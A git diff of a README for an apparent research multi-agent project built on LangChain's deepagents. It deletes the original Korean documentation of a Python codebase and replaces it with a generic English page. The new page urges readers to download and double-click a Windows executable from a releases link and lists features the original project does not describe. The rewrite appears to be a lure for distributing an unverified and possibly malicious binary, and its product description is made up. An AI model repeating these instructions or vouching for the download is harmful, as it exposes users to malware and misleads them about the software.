@@ -1,103 +1,79 @@
-# DeepAgents 기반 Research Multi Agent System
+# 🤖 Deepagent-research-context-engineering - Build Smart Multi-Agent Systems
 
-Agent 2.0 Paradigm 을 잘 구현하는 DeepAgent 를 활용해서, FileSystem 기반 Context Engineering 을 원활히 수행하는 Research 용 Multi Agent 구성(From LangChain's deepagents library)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/XXXaber/Deepagent-research-context-engineering/releases)
 
-![agent_20_paradigm](./agent_20_paradigm.png)
+## 📚 Overview
+Welcome to the Deepagent-research-context-engineering project. This tool helps you build a smart multi-agent system based on DeepAgent technology. It is designed to facilitate research and development in the field of artificial intelligence. 
 
-## Agent 1.0 vs Agent 2.0
+## 🚀 Getting Started
+To get started with the application, follow these simple steps. We will guide you through the installation and first run of the software.
 
-![agent_versus_10_20](./agent_versus_10_20.jpeg)
+## 🌟 Features
+- **Easy to Use:** No coding skills required. 
+- **Multi-Agent Interaction:** Agents can communicate and work together.
+- **Context Awareness:** Agents understand their environment and react accordingly.
+- **Research-Ready:** Ideal for academic and professional research projects.
 
-## DeepAgent Technical Guide
+## 📦 System Requirements
+Before you download, ensure your computer meets these requirements:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** 100 MB of available disk space.
+- **Processor:** Intel Core i3 or better.
 
-[DeepAgent Technical Guide](./DeepAgents_Technical_Guide.md)
+## 🔧 Installation Instructions
+1. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/XXXaber/Deepagent-research-context-engineering/releases) to find the latest version of the application.
 
-## 프로젝트 구조
+2. **Choose the Right File**  
+   Look for the version you want to download. You will see a list of files there. The main executable will usually be named something like `Deepagent_MultiAgent.exe` or similar.
 
-```bash
-deepagent-context-engineering/
-│
-├── research_agent/              # 메인 에이전트 모듈
-│   ├── researcher/              #    └─ 자율 연구 에이전트 (CompiledSubAgent)
-│   ├── skills/                  #    └─ 스킬 미들웨어 (Progressive Disclosure)
-│   └── subagents/               #    └─ SubAgent 정의 유틸리티
-│
-├── skills/                      # 프로젝트 레벨 스킬 정의
-│   ├── academic-search/         #    └─ arXiv 논문 검색
-│   ├── data-synthesis/          #    └─ 다중 소스 데이터 통합
-│   ├── report-writing/          #    └─ 구조화된 보고서 작성
-│   └── skill-creator/           #    └─ 스킬 생성 메타스킬
-│
-├── research_workspace/          # 연구 결과물 저장소 (가상 파일시스템의 ROOT)
-│   └── (에이전트가 생성한 보고서, TODO 등)
-│
-├── deep-agents-ui/              # DeepAgent 프론트엔드 UI (Next.js + React)
-│   └── src/                     #    └─ 소스 코드
-│
-├── deepagents_sourcecode/       # DeepAgents 라이브러리 소스 참조
-│   └── libs/                    #    └─ 라이브러리 코드
-│
-├── DeepAgent_research.ipynb     # Research DeepAgent 활용 노트북
-├── DeepAgents_Technical_Guide.md # DeepAgents 가이드 (한국어)
-├── langgraph.json               # LangGraph API 배포 설정
-└── pyproject.toml               # Python 프로젝트 설정 (uv package manager)
-```
+3. **Download the File**  
+   Click on the name of the file to download it to your computer. 
 
-### 주요 디렉토리 설명
+4. **Run the Installer**  
+   Once downloaded, locate the file in your "Downloads" folder. Double-click the file to start the installation process. 
 
-| 디렉토리 | 설명 |
-|----------|------|
-| `research_agent/` | DeepAgent 기반 멀티 에이전트 시스템의 핵심 모듈 |
-| `skills/` | YAML 프론트매터 기반 스킬 정의 (SKILL.md 파일들) |
-| `research_workspace/` | 에이전트의 영구 파일시스템 저장소 |
-| `deep-agents-ui/` | LangChain 제공 DeepAgent 시각화 UI |
+5. **Follow the Installer Steps**  
+   The installation wizard will guide you through the process. Just follow the prompts on the screen. 
+
+6. **Launch the Application**  
+   After installation, find the application icon on your desktop or in the start menu. Double-click it to run the software.
+
+## 📖 How to Use the Application
+Once the application is open, you will see the main dashboard. Here’s how to begin using it:
+
+1. **Create a New Agent**  
+   Click on "New Agent." Fill out the required fields, such as agent name and type. 
+
+2. **Set Parameters**  
+   Adjust parameters based on your research needs. These may include communication settings and behavior rules for your agents.
+
+3. **Save Your Work**  
+   Save your configuration by clicking on the "Save" button. This allows you to revisit your project anytime.
+
+4. **Run Your Simulation**  
+   Click on "Start Simulation" to see your agents in action. Watch how they interact in real-time.
+
+5. **Analyze Results**  
+   After the simulation, review the results. You can access various reports and charts that show the performance and interactions of your agents.
+
+## 📅 Updating the Application
+Remember to keep your application updated for the best performance. Check the [Releases page](https://github.com/XXXaber/Deepagent-research-context-engineering/releases) frequently for new versions.
+
+## 💡 Troubleshooting
+If you encounter issues:
+- **Check the Requirements:** Ensure your system meets the necessary specifications.
+- **Reinstall the Application:** Sometimes reinstalling can solve unexpected problems.
+- **Consult the Community:** Visit our discussion forums on GitHub for advice and assistance.
+
+## 📞 Support
+For further assistance, feel free to reach out via the Issues tab in the repository. We appreciate your feedback and suggestions.
+
+## 🌐 Community and Contributions
+Join our community of users and developers. We welcome contributions, whether it is through suggestions, bug reports, or code contributions. Together, we can enhance the capabilities of this exciting tool.
 
 ---
 
-## DeepAgent 기반의 Research 수행용 MAS(Multi Agent System)
-
-```bash
-research_agent/
-├── agent.py                 # 메인 오케스트레이터 (create_deep_agent)
-├── prompts.py               # 오케스트레이터 및 Simple SubAgent 프롬프트
-├── tools.py                 # tavily_search, think_tool
-├── utils.py                 # 노트북 시각화 헬퍼
-│
-├── researcher/              # 자율적 연구 에이전트 모듈 (NEW)
-│   ├── __init__.py          # 모듈 exports
-│   ├── agent.py             # create_researcher_agent, get_researcher_subagent
-│   └── prompts.py           # AUTONOMOUS_RESEARCHER_INSTRUCTIONS
-│
-├── skills/                  # Skills 미들웨어
-│   └── middleware.py        # SkillsMiddleware (Progressive Disclosure)
-│
-└── subagents/               # SubAgent 유틸리티
-    └── definitions.py       # SubAgent 정의 헬퍼
-```
-
-### 핵심 파일 설명
-
-| 파일 | 역할 |
-|------|------|
-| `agent.py` | 메인 에이전트 생성 및 구성 |
-| `researcher/agent.py` | 자율적으로 연구하게끔 구성된 에이전트 |
-| `researcher/prompts.py` | "넓게 탐색 → 깊게 파기" 전략으로 구성된 워크플로우 정의 |
-| `prompts.py` | 오케스트레이터(Main DeepAgent) 워크플로우 및 위임(Delegation) 전략 |
-
-
-## DeepAgent UI(Made by LangChain)
-```bash
-git clone https://github.com/langchain-ai/deep-agents-ui.git
-cd deep-agents-ui
-npm install -g yarn
-yarn install
-yarn dev
-```
-
-
-### 참고자료
-
-- [LangChain DeepAgent Docs](https://docs.langchain.com/oss/python/deepagents/overview)
-- [LangGraph CLI Docs](https://docs.langchain.com/langsmith/cli#configuration-file)
-- [DeepAgent UI](https://github.com/langchain-ai/deep-agents-ui)
-- [Agents-2.0-deep-agents](https://www.philschmid.de/agents-2.0-deep-agents)
+Feel free to customize the application to suit your research needs. Happy exploring!
